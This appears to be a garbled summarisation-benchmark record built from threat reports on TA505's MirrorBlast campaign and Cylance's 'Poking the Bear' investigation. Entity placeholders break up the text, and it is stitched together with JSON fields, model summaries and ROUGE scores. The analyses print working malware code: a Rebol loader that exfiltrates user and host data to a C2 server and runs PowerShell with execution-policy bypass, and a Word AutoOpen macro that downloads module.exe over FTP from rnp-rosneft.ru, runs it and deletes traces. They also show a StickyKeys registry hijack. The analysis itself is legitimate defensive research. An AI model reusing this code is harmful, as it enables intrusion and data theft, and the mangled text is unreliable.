queries are true : Computer name is equal to the user domain . Username is equal to admin or administrator . We have observed different variants of the document , in the [ORDINAL] first variants there was n\u2019t any anti - sandboxing and the macro code was hidden behind the Language and Code document information properties , later it moved to the sheet cells . Additionally , the code has been added [CARDINAL] one more obfuscation layer on top of the previous obfuscationFigure [CARDINAL] 5 : An Excel document with lightweight macro and anti - sandboxing . The command executes JScript through the [ORG] AddCode method from the [ORG] ScriptControl ActiveX object ( [ORG] ScriptControl [ORG] Methods ) . This method loads and evaluates the code similarly to how Run or Evaluate executes the statement ( the official documentation might be misleading).The macro executes the following JScript : Figure [CARDINAL] 6 : An obfuscated JScript command . The evaluated deobfuscated command is : Figure [CARDINAL] 7 : The evaluated JScript . This spawns the msiexec.exe process , which is responsible for downloading and installing MSI package . It is also a known way to break an attack chain sequence and complicate attack trajectory visibility ( msiexec LOLBin ) . The msiexec.exe process executes not as a direct child process of [ORG] Excel.exe , this , with the addition of setting UILevel to - 2 ( Completely silent installation ) helps with sandbox evasion . MSI package3/9We have observed [CARDINAL] two variants of the MSI installer : [PERSON] KiXtart and REBOL . Both variants are generated using [LAW] the [LAW] Windows [LAW] Installer [LAW] XML legitimate software language interpreter executable ( [PERSON] KiXtart or REBOL ) and the other is the malicious script . Figure [CARDINAL] 8 : Rebol / [ORG] KiXtart dropped in the [PRODUCT] ProgramData folder . Some of the MSI packages included autorun persistence through ` Software\\Microsoft\\Windows\\CurrentVersion\\Run` . Figure [CARDINAL] 9 : MSI package registry properties . REBOL variantRebol is a cross - platform data exchange language and a multi - paradigm dynamic programming language ( url The [ORDINAL] first stage Rebol script is base64 encoded.rebol [ ] do to - string debase \" [ORG] YXR0ZW1wdFsKCWNhbGwge2VjaG8gJVVTRVJET01BSU4lXCVVU0VSTkFNRSUgPiBuYW1lICYmIGZvciAvZiAidG9rZW5zPTQtNSBkZWxpbXMCode [ORG] Block [CARDINAL] 1 : The [ORDINAL] first - stage Rebol script . Next , it exfiltrates targeted information by sending a base64 encoded GET request that represents the user domain , username , OS version , architecture , along with a Rebol script build number ( build=1.0.0 ) . Older script versions do n\u2019t contain the build number . The [CARDINAL] C2 sends back a [ORG] UUID that will be associated with the victim machine and will be used in future communications.call \" echo % USERDOMAIN%\\%USERNAME% > name & & [ORG] VER [ORG] > [ORG] os & & echo % PROCESSOR_ARCHITECTURE% > arch \" wait [CARDINAL] 5 reg : enbase join \" name= \" [ trim / all read % name \" & os= \" trim / all read % os \" & arch= \" trim / all read % arch \" & build=1.0.0 \" ] either exists ? % uuid [ uuid : read % uuid ] [ uuid : read join url reg uuid : parse uuid \" | \" uuid : uuid/2 write % uuid uuid ] Code Block 2 : The Rebol script sends the victim 's data to the [ORG] C2.Then , the script will enter an infinite waiting loop where it sends the encoded [ORG] UUID to the [CARDINAL] C2 while waiting for the response \u201c [CARDINAL] 3 . \u201d . Once it receives the appropriate response , it will execute a [ORG] Powershell command that downloads an archive file and extracts its content to a folder named archive . In that folder is the next stage of the Rebol script that will be executed.while[true ] [ p : enbase join \" uuid= \" uuid read join url p a : read join url p l : read join url p if a = = \" [CARDINAL] 3 \" [ call \" powershell.exe -exec bypass -enc do load % archive\\payload.rb read join url enbase join \" uuid= \" [ uuid \" & status = true \" ] ] wait [PRODUCT] 3]Code [PRODUCT] Block [CARDINAL] 3 : The loop waiting for the payload from the C2.4/9Figure [CARDINAL] 10 : The executed [ORG] Powershell commands . We have also observed a newer version of Rebol script ( build=1.0.2 ) that omits the [ORG] Powershell execution part . Instead , it implements the same logic with Rebol language code ; this is done to decrease noise and script size ( no [ORG] PowerShell process execution as part of the attack chain ) . At the time of writing , we could n\u2019t retrieve the next stage Rebol script ( payload.rb).KiXtart variantKiXtart is a free - format scripting language and has rich built - in functionality for easy scripting ( url dropped script is encrypted or , as the documentation suggests , tokenized script . The [PERSON] KiXtart documentation describes it as\u201cIn practical terms this means that tokenized scripts are perfectly safe from attempts at viewing or changing them by regular end users . However , tokenized scripts are not safe from attacks by people with enough time and determination on their side . \u201d ( [PERSON] Kixtart Pre - tokenizing scripts).Quickly searching for ` Decrypt ` in the strings leads to the corresponding subroutine where the decryption happens . Figure [CARDINAL] 11 : [PERSON] KiXtart executable - decryption function . Dumping the strings from memory after they were decrypted resulted in the following : Figure [CARDINAL] 12 : Strings from the dumped memory . Looking at the strings along with the .pcap file we captured , we see that the script sends the victim \u2019s machine information ( domain , computer name , user name , process list ) to the C2 . The [CARDINAL] C2 responds with a number that will indicate how to proceed , as with the Rebol variant . Attribution to TA505Below are the TTPs that allows us to safely attribute the attack chain to TA505:5/9Infection chain consists of [ORG] Email - [ORG] > [ORG] XLS - [ORG] > [ORG] MSI ( Rebol / [ORG] KiXtart loader ) . The MSI component has a high resemblance to the [CARDINAL] Get2 ( [ORG] GetandGo ) loader from [ORG] TA505 [ORG] Using [ORG] SharePoint / [ORG] OneDrive lure theme . Using cdn*dl*fileshare , * onedrive * or * dropbox * as part of the domain name . [CARDINAL] One of the [ORG] SharePoint lure themed emails lead to the following page : Figure [CARDINAL] 13 : Page with mismatched MD5 in the details pane . We have noticed that the MD5 in the details pane does n\u2019t match [PRODUCT] the [PRODUCT] MD5 [PRODUCT] of [PRODUCT] the [PRODUCT] Excel document . In fact , this MD5 belongs to a legitimate [PERSON] Putty [PERSON] SFTP client . This specific hash was mentioned in a related TA505 intrusion . According to @ffforward , the next - stage Rebol script leads to the [PRODUCT] FlawedGrace RAT that is associated with TA505 ( malpedia- flawedgrace)ConclusionsTA505 is one of many financially motivated threat groups currently active in the marketplace . They are also one of the most creative , as they have a tendency to constantly shift the attacks they leverage to achieve their goals . This new attack chain for [ORG] MirrorBlast is no exception for TA505 or for other innovative threat groups . If anything , the shift in the attack chain is a further indication that organizations can ill afford to take a defensive , reactive approach to their security . They must remain constantly vigilant , iterating on security procedures to ensure they are not caught off - guard when new TTPs are deployed to breach their defenses . The ability of the [ORG] MirrorBlast attack to have very low detections in [ORG] VirusTotal is also indicative of the focus most groups have on evading detection - centric solutions . Yet again , it is clear that the market \u2019s reliance on detection and response leaves them open to more attacks than it 139.59.93[.]223 207.246.101[.]153 155.138.205[.]35 [DATE] 45.79.239[.]23 [DATE] 95.216.138[.]82 [DATE] 194.180.174[.]6 185.202.93[.]201 185.10.68[.]235 [CARDINAL] 185.183.96[.]147 [CARDINAL] 185.225.19[.]246 185.176.220[.]198 5.189.222[.]161 46.161.40[.]172feristoaul[.]com 23.19.58[.]52 C:\\ProgramData\\Local\\Google\\exemple.rb C:\\ProgramData\\temp\\AudioDriver.exe C:\\ProgramData\\temp\\image.ico C:\\ProgramData\\Excel\\svchost.exe C:\\ProgramData\\Excel\\svchost.bin C:\\ProgramData\\001\\arab.exe C:\\ProgramData\\001\\arab.bin9/9", "generated_text": "the document; a new version; financial services organizations; September; a Malspam campaign; Excel; a malware; the malware; the Excel files; a malware attachment; Google feedproxy URL; SharePoint; OneDrive lure; a File Share Request; protection; sandboxing; the macro code; the phishing email; the attackers; the malware; detection; the tool; the sandboxing; the macro code; the malware; a payload; the byte; sandboxes; the macro; detection; a GET; the payload; the byte; the sandboxing; the sandboxing; the end; a payload; The campaign; a financial motivation; this malware; a financial sector.", "ref_text": "<START-1>The report by Morphisec Labs analyzes a new phishing campaign dubbed MirrorBlast that is targeting financial organizations. The attack starts with emails containing malicious links that download a weaponized Excel document. The Excel document contains a lightweight macro with anti-sandboxing checks. When enabled, it uses Windows Installer to download an MSI package which deploys either a KiXtart or Rebol script malware. This makes network requests to exfiltrate system data and can download additional payloads. Morphisec assesses with medium to high confidence that MirrorBlast is the work of TA505 based on TTP similarities with things like GetandGo loader, OneDrive lures, and the next-stage FlawedGrace RAT payload. The campaign infrastructure is expanding rapidly as well. The report includes extensive IOCs spanning email attachments, C2 domains/IPs, registry keys, file hashes, and YARA rules. It also provides analysis of the macro, script obfuscation techniques, and C2 communication. In summary, MirrorBlast illustrates the ongoing innovation of advanced cybercriminal groups like TA505. The financial sector remains an attractive target and defenders must adapt to new types of attacks that bypass traditional security controls. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.44171779141104295, "gpt3/lexical/rouge_rouge2": 0.11111111111111112, "gpt3/lexical/rouge_rougeL": 0.25153374233128833, "gpt3/lexical/rouge_rougeLsum": 0.25153374233128833, "gpt3_generated_text": ["The article discusses a new version of the MirrorBlast campaign that is targeting financial services organizations. The campaign utilizes a malspam campaign in September that delivers malicious Excel documents as attachments. The Excel files contain a lightweight macro code that is difficult to detect on VirusTotal. The macro code performs anti-sandboxing checks and executes JScript commands to download and install a malware payload. The malware is delivered through a compromised SharePoint or fake OneDrive site, further evading detection. The campaign has similarities to the tactics used by the threat group TA505, which has a financial motivation for their actions. This campaign highlights the dangers for organizations that rely on detection-based security and sandboxing. Financial organizations are frequently targeted by threat actors due to the valuable customer data they hold and their ability to pay large sums of money to regain access to encrypted data."]}, {"split_name": "test", "sample_id": "test_64", "prompt_text": "Extract the keywords: Poking the Bear : Three - Year [DATE] Campaign [DATE] Targets [DATE] Russian [DATE] Critical [DATE] Infrastructurethreatvector.cylance.com/en_us/home/poking-the-bear-three-year-campaign-targets-russian-critical-infrastructure.htmlby Cylance Threat Intelligence Bulletin | [DATE] December 11 , [DATE] 2018 Nation - state conflict has come to dominate many of the policy discussions and much of the strategic thinking about cybersecurity . When events of geopolitical significance hit the papers , researchers look for parallel signs of sub rosa cyber activity carried out by state- sponsored threat actors \u2014 espionage , sabotage , coercion , information operations \u2014 to complete the picture . After all , behind every story may lurk a cyber campaign . But ordinary criminals read the newspaper too and are keenly aware of the bias some researchers bring to the table . Exploiting that bias can provide additional camouflage , another layer of seeming invisibility , making threat actors harder to detect . In this Threat Intelligence Bulletin , we \u2019ll show how an investigation into the apparent targeting of a state - owned [NORP] Russian oil company led to the uncovering not of a state- sponsored campaign but of the bold activity of what we believe to be a criminal effort motivated by the oldest of incentives \u2014 money . [PERSON] Background [PERSON] Rosneft calls itself the world \u2019s largest publicly traded oil company , and , according to recent analysis in [ORG] the [ORG] New [ORG] York [ORG] Times , it is also a prominent foreign policy tool of the [NORP] Russian government . [CARDINAL] More [CARDINAL] than [CARDINAL] half of the company is owned by [GPE] Moscow and serves as a major pillar of critical infrastructure for [GPE] Russia as well as other neighboring nation states . So when a deal reportedly worth an excess of $ 10 [MONEY] billion was announced to take [PERCENT] nearly 20 % of the company private , news organizations around the world took note . The deal quickly became the subject of international political intrigue : Who were the buyers ? Why was it sold ? Who brokered the deal ? Facts that became even more apparent when the transaction received conspicuous mention in the now - infamous [PERSON] Steele [PERSON] Dossier . Reporters , business leaders , and international observers also focused scrutiny on [ORG] Rosneft in part because the deal was , according to news reports , fraught with delays and setbacks and came to involve a cast of characters that reportedly included a former [NORP] Qatari diplomat turned head of a sovereign wealth fund . Everything we learned about Rosneft in [DATE] the [DATE] last [DATE] few [DATE] years \u2014 its status as critical infrastructure , the huge sums of money involved in its privatization , its domestic and international political significance \u2014 made it a highly likely and legitimate target of foreign espionage efforts.1/14Indeed , when we at Cylance first saw the name \u201c Rosneft \u201d emerge in our research , we thought that was exactly what we were looking at : another state or state - sponsored espionage effort . But we soon discovered that our initial impressions were flawed . Evolution of a Threat In [DATE] July [DATE] 2017 , Cylance stumbled upon some interesting macros embedded in Word documents we uncovered in a common malware repository that seemed to be aimed at [LANGUAGE] Russian - speaking users . We observed the same type of document resurface in [DATE] the [DATE] beginning [DATE] of [DATE] 2018 and decided to take a closer look . Upon closer inspection , we noticed that the malware author meticulously used command and control ( C2 ) domains which very closely mimicked their real counterparts in the [NORP] Russian oil and gas industries , in particular [ORG] Rosneft and subsidiaries of [ORG] Rosneft . As we investigated further , we discovered that the threat actor had created similar sites to mimic [CARDINAL] more [CARDINAL] than [CARDINAL] two [CARDINAL] dozen mostly state - owned oil , gas , chemical , agricultural , and other critical infrastructure organizations , in addition to major [NORP] Russian financial exchanges . The [ORDINAL] first Rosneft - related site we came across was \u201c rnp - rosneft[.]ru \u201d which was designed to resemble the legitimate webpage \u201c mp - rosneft[.]ru \u201d . The only reference to this domain we could identify was the email address \u201c sec_hotline@mp - rosneft[.]ru \u201d which was used by [ORG] Rosneft for confidentially reporting corporate fraud , corruption , and embezzlement . After a bit of malware excavation , we discovered that the author had been operating for [DATE] more [DATE] than [DATE] three [DATE] years with very few changes to the actual malware used other than his / her targets . Interestingly , we uncovered evidence that suggests the actor started out targeting the gaming community , specifically users of [GPE] Steam , then quickly evolved to more lucrative endeavors . Technical AnalysisPhishing Documents Analysis Cylance researchers identified several phishing documents which used [ORG] Microsoft [ORG] Office macros to deliver malicious implants to their targets . It \u2019s not entirely clear whether these were specifically targeted at isolated groups or utilized the old spray - and - pray method to Filename : \u041d\u0430 \u043e\u0437\u043d\u0430\u043a\u043e\u043c\u043b\u0435\u043d\u0438\u0435.doc ~ For Review.docSub AutoOpen ( ) [PERSON] Dim fso , tf [PERSON] Dim [PERSON] St As String [PERSON] Dim LocalFile As [PERSON] String [PERSON] Set fso = CreateObject(\"Scripting . FileSystemObject \" ) Set objShell = CreateObject(\"WScript.shell \" ) LocalFile = Environ(\"APPDATA \" ) & \" \\1.cmd \" St = \" cd % APPDATA% \" & vbNewLine St = St + \" echo open rnp - rosneft.ru>>1.txt \" & vbNewLine St = St + \" echo admin_root>>1.txt [ORG] \" [ORG] & [ORG] vbNewLine [ORG] St = St + \" echo [ redacted]>>1.txt \" & vbNewLine St = St + \" echo cd /public_html/>>1.txt \" & vbNewLine St = St + \" echo binary>>1.txt [ORG] \" [ORG] & [ORG] vbNewLine [ORG] St [ORG] = [ORG] St + \" echo get module.exe module.exe>>1.txt [ORG] \" [ORG] & [ORG] vbNewLine [ORG] St [ORG] = [ORG] St [ORG] + [ORG] \" echo bye>>1.txt [ORG] \" [ORG] & [ORG] vbNewLine [ORG] St = St + \" ftp.exe [ORG] -s:1.txt [ORG] & [ORG] start module.exe & del /f [CARDINAL] 1.txt & del /f 1.cmd\"Set tf = fso . CreateTextFile(LocalFile , True ) tf . Write ( St ) tf . [PERSON] CloseIf fso . FileExists(LocalFile ) = True Then Selection . [ORG] WholeStory [ORG] Selection . Delete Unit:=wdCharacter , Count:=1 objShell . Run \" cmd /K cd % APPDATA% & 1.cmd \" , [ORG] 0 [ORG] Selection . [ORG] TypeText Text:= \" ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? \" + \" ? ? ? \" End IfEnd SubFigure 1 : Macro Contents of Phishing DocumentAt a high level , this macro will write a number of [ORG] FTP commands to a text file named \u201c [CARDINAL] 1.txt \u201d in % APPDATA% . When executed by the last command it will login and download a file from an ftp server hosted on \u201c rnp - rosneft[.]ru \u201d and save it as \u201c module.exe \u201d . It then starts the \u201c module.exe \u201d binary and deletes another file named \u201c 1.cmd \u201d . The binary \u201c module.exe \u201d was a modern variant of a family of malware that ESET calls \u201c [ORG] RedControle . \u201d Cylance identified several other phishing documents which operated in a similar vein that are listed in the [LOC] Appendix . [PERSON] Malware [PERSON] Analysis We were able to recover several recent samples associated with phishing attempts connected to the rnp - rosfnet[.]ru domain as well as some older samples tied to trstorg[.]ru from [DATE] July [DATE] 2017 . From what we could gather , \u201c tstorg[.]ru \u201d was originally the website of [NORP] a3/14Russian company called \u201c TechnoSnabTorg \u201d involved in the sale of spare parts for drilling and road - building equipment ; the company specialized in providing parts for [ORG] Caterpillar , [ORG] Komatsu , [ORG] Volvo , [ORG] Fiat , and [ORG] Hitachi equipment . This sample was [ORDINAL] first submitted to online virus scanners in [DATE] July [DATE] 2017 and detected by [CARDINAL] only [CARDINAL] 13 companies at that time : SHA256 of [CARDINAL] 2017 [ORG] RedControle Sample : \u0410\u043a\u0442\u0443\u0430\u043b\u044c\u043d\u044b\u0439 \u041f\u0420\u0410\u0419\u042110.07.2017.exe , ApMsgFwd.exe , SetLogin1Connect.exeThe backdoor was programmed in [ORG] Delphi and communicates over HTTP to [CARDINAL] two [CARDINAL] C2 servers . It sends information about the [ORG] IP address , hostname , and attached drives in its initial communications . It [ORDINAL] first attempts to communicate directly to the [ORG] IP address \u201c [CARDINAL] 91.211.245[.]246 \u201d on [ORG] TCP port [CARDINAL] 80 and then will attempt to communicate to \u201c 83.166.242[.]15 \u201d on [ORG] TCP port [DATE] 17425 . Keystroke data , clipboard data , as well as window names are communicated in clear text via HTTP to the [CARDINAL] 91.211.245[.]246 in near - real time as the victim interacts with their computer . The information is collected using a well - known method leveraging the SetWindowsHookExA API . [ORG] Commands are received from the other C2 server \u201c [CARDINAL] 83.166.245[.]15 \u201d in what appears to be cleartext ; however , the backdoor also has the ability to communicate over [ORG] SSL using the [ORG] Delphi [ORG] Indy library : GET /buffer.php?buffer=--------------------------------------------------------------------- % 0D%0AIDA+- + C%3A%5CDocuments+and+Settings%5CAdministrator%5CDesktop%5Ctst%5CApMs gFwd.exe%0D%0A--------------------------------------------------------------------- % 0D%0A17425%0D%0A---------------------------------------------------------------------%0D%0A HTTP/1.1 Accept : text / html , * / * Accept - Encoding : identity User - Agent : [GPE] Mozilla/3.0 ( compatible ; [PERSON] Indy [PERSON] Library ) GET /key.php?key=--------------------------------------------------------------------- % [CARDINAL] 0D%0AC%3A%5CWINDOWS%5Csystem32%5Ccmd.exe+-+FakeNet.exe%0D%0A-- -------------------------------------------------------------------%0D%0Ahelp%0D%0A%0D%0A----- ----------------------------------------------------------------%0D%0A HTTP/1.1 Accept : text / html , * / * Accept - Encoding : identity User - Agent : [GPE] Mozilla/3.0 ( compatible ; [PERSON] Indy Library)Figure [CARDINAL] 2 : Example TCP HTTP Requests [PERSON] Sending [PERSON] Keystroke and Window Data4/14The backdoor installs itself using the good old - fashioned [PERSON] Run key under the infected user \u2019s registry hive\u201cHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ApMsgFwd.exe\u201d . The backdoor had the ability to upload and download files , manipulate files and folders , compress and decompress files using [ORG] ZLIB , enumerate drive information and host information , elevate privileges , capture screenshots and webcam pictures , block and/or simulate user input , log keystrokes , and manipulate processes on the infected system . Directives from the [CARDINAL] C2 were randomly broken up by the character \u201c _ \u201d in an attempt to likely evade HIDS and [ORG] NIDS signatures such as the command \u201c ST_A_RT_FI_LE\u201d . Later versions of [ORG] RedControle used randomized strings broken up by the same \u201c _ \u201d character to further hinder signature - based analysis and reverse engineering efforts . In the sample Cylance researchers analyzed , the initial connection looked something like this : Where the string in [ORG] BLUE was sent by the C2 server and the string in RED was sent by the victim as an initial check in containing the [ORG] IP address and a unique victim identifier . The backdoor operated using a series of threads which were designed to segment different backdoor functionality into autonomous threads which ran based on different pre - defined [ORG] Delphi - based timers . The backdoor appeared to be a mishmash of different authorship with the keylogger portion containing [LANGUAGE] Portuguese language strings and other functions related to process manipulation containing references to [LANGUAGE] Slavic language strings . These strings were eventually removed or obfuscated in later versions . The [PERSON] Dropper binary while showing the potential victim a nice picture of a holiday present . The dropper was relatively uninteresting ; however , a [PERSON] Sticky [PERSON] Keys backdoor would also be placed on the system , which warranted additional analysis . [PERSON] Dropper [PERSON] SHA256 [PERSON] Hash : \u201c % ALLUSERSPROFILE%\\Documents \u201d , \u201c svhost.exe \u201d and \u201c system.exe \u201d and created [CARDINAL] two associated [PERSON] Run keys to maintain persistence for both executables . The program \u201c svhost.exe \u201d was the aforementioned [ORG] RedControle variant with network callbacks to the domain \u201c trstorg[.]ru \u201d and the [ORG] IP address \u201c [CARDINAL] 83.166.243[.]48\u201d . The \u201c system.exe \u201d file was a StickyKeys backdoor programmed in [GPE] Delphi . It [ORDINAL] first opened [ORG] TCP port [CARDINAL] 3389 in [ORG] the [ORG] Windows [ORG] Firewall and then set the following Registry [PERSON] Keys : HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\\Debugger - > C:\\WINDOWS\\system32\\taskmgr.exe HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\fDenyTSConnections - > null valueThe file was primarily responsible for enabling RDP on the target system and performing a sticky keys hijack to point to the legitimate \u201c taskmgr.exe \u201d binary . If our readers are unfamiliar with StickyKeys , it was originally designed for people who have difficulty holding down [CARDINAL] two or more keys simultaneously . StickyKeys can be enabled on Windows by rapidly pressing the shift key [CARDINAL] five times . The registry key above will simultaneously launch the [PRODUCT] Task Manager binary \u201c taskmgr.exe \u201d along with the intended StickyKeys binary . The [PERSON] StickyKeys backdoor can then test corresponded to \u201c google.ru \u201d and various subdomains . If the test is successful , it will make the following HTTP request to \u201c trstorg[.]ru \u201d on [ORG] TCP port [CARDINAL] 80 : GET /bas.php HTTP/1.1 User - Agent : DMFR Host : trstorg.ru Cache - Control : no - cacheHTTP/1.1 [CARDINAL] 200 OK Server : nginx Date : Thu , [DATE] 19 [DATE] Jan [DATE] 2017 17:18:48 [ORG] GMT Content - Type : text / html Content - Length : 0 Connection : keep - alive Keep - Alive : timeout=60 X - Powered - By : PHP/5.5.9 - 1ubuntu4.Figure 3 : Example Request and [PERSON] Server [PERSON] Response from StickyKeys BackdoorThis particular sample will no longer work as the [ORG] IP address \u201c [CARDINAL] 80.254.96[.]251 \u201d appeared to have been reassigned to another party and no longer operates a webserver . Open Source Intelligence Analysis The [ORG] RedControle backdoors frequently created the unique mutex6/14\u201cAppFilQsSSSwwww_jadknskjnd_jadknskjnd\u201dwhich directly links the above samples to the following hashes through open source \u201c h84622.s05.test - hf[.]su\u201d . These domains led to [CARDINAL] two primary [ORG] IP addresses : \u201c [CARDINAL] 91.227.16[.]115 \u201d and \u201c 91.227.16[.]6 \u201d as well as [CARDINAL] a [CARDINAL] few [CARDINAL] hundred unique file hashes . The [ORG] IP addresses \u201c [CARDINAL] 109.68.190[.]244 \u201d and \u201c [CARDINAL] 46.38.50[.]106 \u201d which resolved to \u201c sxe- csgo[.]net \u201d in [DATE] 2015 and [DATE] 2016 let Cylance definitively tie this subset of activity to activity targeting the [NORP] Russian Steam community as well as the [PERSON] Counterstrike and CS : Go communities previously documented here , here , and here . Infrastructure Analysis The threat actor left bits of infrastructure open over time and Cylance was able to harvest some of the server - side scripts utilized by the malware for tracking and recording data stolen from intended victims . Additionally , the attacker utilized [ORG] Cloudflare for free bulk SSL certificates , which inadvertently exposed a number of domains . The attacker put a lot of time and effort into closely imitating legitimate domains and continually altered their targets over time . They would also occasionally register legitimate domains after the domains had expired . The actor relied heavily upon the [NORP] Lithuanian provider \u201c vpsnet[.]lt \u201d likely as a result of the low cost overhead of a couple euros per month per virtual private server ( VPS).Conclusions When we [ORDINAL] first discovered that the threat actor was using [CARDINAL] more [CARDINAL] than [CARDINAL] two [CARDINAL] dozen websites to mimic real [NORP] Russian critical infrastructure companies , we were intrigued . The effort required to set up those domains seemed disproportionate to the perceived benefit of using them simply as command - and - control infrastructure.7/14Then we saw a paid contributor article in a [NORP] Russian edition of [ORG] Forbes , published in [DATE] April [DATE] 2017 and entitled ( in Google \u2019s translation to [LANGUAGE] English ) Attack of the Clones : How Schemes Work with Fake Sites of [ORG] Rosneft and Other Large Companies . The author was [PERSON] Ilya [PERSON] Sachkov , the founder and CEO of infosec company Group - IB and a member of cybercrime expert committees in [ORG] the [ORG] Council [ORG] of [ORG] Europe and the OSCE.The article described what appeared to be unpublished Group - IB research findings into an elaborate criminal scheme wherein a threat actor was creating near - clones of legitimate [NORP] Russian critical infrastructure companies \u2014 [ORG] Rosneft most prominent among them \u2014 in order to harvest credentials and perpetuate fraud . In the article , [PERSON] Sachkov provided screen shots of many of the mimicked sites to establish just how painstakingly close to the original these fake sites were designed to look . The article referenced several of the companies and websites by name , which Group - IB said were part of the fraud campaign . [CARDINAL] At [CARDINAL] least [CARDINAL] one of the affected companies was described in the article as being a client of Group - IB.That company \u2019s domain , as well as nearly all of the other domains cited by Group - IB were also uncovered in the Cylance investigation . For example , in addition to [ORG] Rosneft , they included : [PERSON] Mendeleevkazot , [ORG] HCSDS , and [ORG] EuroChem . [PERSON] Mendeleevkazot is a fertilizer manufacturer and part of a larger [NORP] Russian critical infrastructure holding company . [ORG] HCSDS is an acronym for [ORG] a [ORG] Siberian [ORG] Business [ORG] Union , a holding company comprised of several [NORP] Russian critical infrastructure companies . [ORG] EuroChem [ORG] ( Group - IB \u2019s apparent client ) is a [NORP] Swiss - based fertilizer company with its primary mining activity in [GPE] Russia . Its name came up in several news - related searches indicating its involvement in large financial transactions as well as geopolitical maneuvering . Given the overlap in findings and the direct connection to past criminal campaigns targeting the gaming community , it seemed clear we were looking at the same operation \u2014 a criminal operation , not nation - state espionage activity . The line between well - organized criminal efforts and nation - state activity can often be blurry , but practitioners and consumers of threat intelligence should beware of inherent biases . As we have shown in this [GPE] Bulletin , what appears at [ORDINAL] first blush to be a clear indicator of nation - state malfeasance may in fact simply allow a criminal to hack your way of thinking shortly before hacking your organization . Appendix 3 - sendmail[.]ru a - nhk[.]ru acron[.]ru[.]com agrarnik - ooo[.]ru agrocentrer - eurohem[.]ru audemar - piguet[.]ru autch - mail[.]ru azot - n[.]ru azot - sds[.]ru azotsds[.]ru azs - gazpromneft[.]ru bashneft - centralasia[.]ru bitmain[.]org[.]ru bitum - gazpromneft[.]ru bitum - rosneft[.]ru bitum - samara[.]ru bitumen - rosneft[.]ru bitumnpk[.]ru bor - silicat[.]ru9/14box5[.]photosfromcessna[.]com bulgarsyntezi[.]ru bunker - rosneft[.]ru card - rn[.]ru cargill[.]com[.]ru center - nic[.]ru chem - torg[.]ru china - technika[.]ru combisapsan[.]ru contacts[.]rosneft - opt[.]su cryptoman[.]org[.]ru cuban - phosagro[.]ru dc-02ec0b5f - mail[.]mail - autch[.]ru dc-0649e3d7 - mail[.]mp - star[.]ru dc-45e81045 - mail[.]cibur[.]ru dc-99de0f72f24b[.]3 - sendmail[.]ru dv - china[.]ru electronrg[.]ru euro - bitum[.]ru euro - chimgroup[.]ru eurochem - nevinnomissk[.]ru eurochem - novomoskovsk[.]ru eurochem - novomoskovsk[.]ru[.]com eurochem - orel[.]ru eurochem - trading[.]com eurochem - trading[.]ru eurochemnovomoskovsk[.]ru eurochim[.]ru[.]com eurohem - novomokcovsk[.]ru exp[.]gazpromlpj[.]ru expert - cabel[.]ru farr - post[.]ru frigat - m[.]ru g - pntrade[.]ru gazprom - bitumen[.]ru gazprom - centralasia[.]ru gazprom - international[.]su gazpromlpq[.]ru10/14gazpromneft - aero[.]ru gispnd[.]ru gpn - salavat[.]ru hcsds - azot[.]ru imap[.]mrggazprom[.]ru inter - finans[.]ru inter - lens[.]ru john - dir[.]ru kartll[.]ru kolomna - profil[.]ru kub - oil[.]ru kuban - phosagro[.]ru kyrgyzstan - gazprom[.]ru lpggazprom[.]ru lubricants - rn[.]ru lubricants - rosneft[.]com lubricants - rosneft[.]ru lukoil[.]com mag - numoil[.]ru map[.]ros - razvitie[.]ru mc - gp[.]ru mendeleevsk - azot[.]ru metalloprakat[.]ru mir - polimer[.]ru mnpz - gazpromneft[.]ru mp - star[.]ru mpt - o[.]ru mrg - gazprom[.]ru mrggazprom[.]ru mta5[.]boommail[.]org nic - center[.]ru nknpz[.]rosneft - opt[.]su nl - mk[.]ru oil - gazpromneft[.]ru omega - metal[.]ru onlinecontract[.]su ooo - agrarnik[.]com ooo - tandem[.]net11/14opt - rosneft[.]ru poligal - vostok[.]ru polimer - trubi[.]ru polimer16[.]ru[.]com pop[.]gazprom - centralasia[.]ru pop[.]mnpz - gazpromneft[.]ru pop[.]opt - rosneft[.]ru pop[.]rnp - rosneft[.]ru pop[.]ros - razvitie[.]ru [PERSON] postaitaliana[.]win prof - nastillist[.]ru prof - zavod[.]ru refas[.]rnp - rosneft[.]ru refinery - yaroslavl[.]ru refinery - yaroslavl[.]su rn - cpr[.]ru rn - lubricants[.]ru rnp - rosneft[.]ru roamingupdate[.]eu ros - eurochem[.]ru ros - metal[.]ru ros - nefti[.]ru ros - razvitie[.]ru rosagrotrayd[.]ru rosneft - centralasia[.]ru rosneft - de[.]com rosneft - opt[.]com rosneft - opt[.]su rosneft - tender[.]ru rosneft - tender[.]su rosneft - tuapse[.]ru rospolimery[.]ru rost - selmash[.]ru rps[.]ru[.]com ru - uralchem[.]ru ru - uralhim[.]ru [ORG] ruproflist[.]ru rus - agrohim[.]ru rusagro - him[.]ru rusagrohim[.]com12/14russbitum[.]ru saharzol[.]com sal - stek[.]ru salstek[.]com[.]ru samp[.]real - city[.]lt sarat - steklo[.]ru saratovstroisteklo[.]ru saratovstroy - steklo[.]ru severstal[.]com[.]ru sibur[.]com[.]ru sibur[.]ru[.]com siburint[.]ru simf - khp[.]ru smtp[.]gazpromlpj[.]ru spectech - china[.]ru spi - mex[.]ru steklo - stroj[.]ru sx[.]perfecttool[.]net ta - bitum[.]ru tdbkh[.]ru teh - mail[.]ru tektorg - rosneft[.]ru tender - rosneft[.]com tender - rosneft[.]net tender - rosneft[.]ru tender - rosneft[.]su tender[.]ros - nefti[.]ru tiret - salt[.]ru tuapse - rosneft[.]ru ufaneftehim[.]bashneft[.]su ufaorgsintez[.]bashneft[.]su ural - met[.]su uralchem[.]net[.]ru uralchim[.]com[.]ru13/14uralhem[.]ru vitohim - rostov[.]ru vojxua[.]iheys[.]in volga - phosagro[.]ru vostok - polygal[.]ru wapmafija[.]eu world - provodnik[.]ru wtpc[.]ru xn----7sbiki4aifik1ax[.]xn -- p1ai xn----8sbyfdnfhp0c[.]xn -- p1ai xn----gtbcbb8bdhqbmdl1a[.]xn -- p1ai xn----gtbcbb8bdhqbmdl1a5j[.]xn -- p1ai [PERSON] xn--80aaoboarccvfll0ah5mza[.]xn -- p1ai xn -- e1apchgin[.]xn -- p1ai xn -- j1aicfcj5e[.]xn -- e1apchgin[.]xn -- p1ai yandex[.]mail - autch[.]ru yug - polimer[.]ruShare It : Research & IntelligenceAbout The AuthorCylance 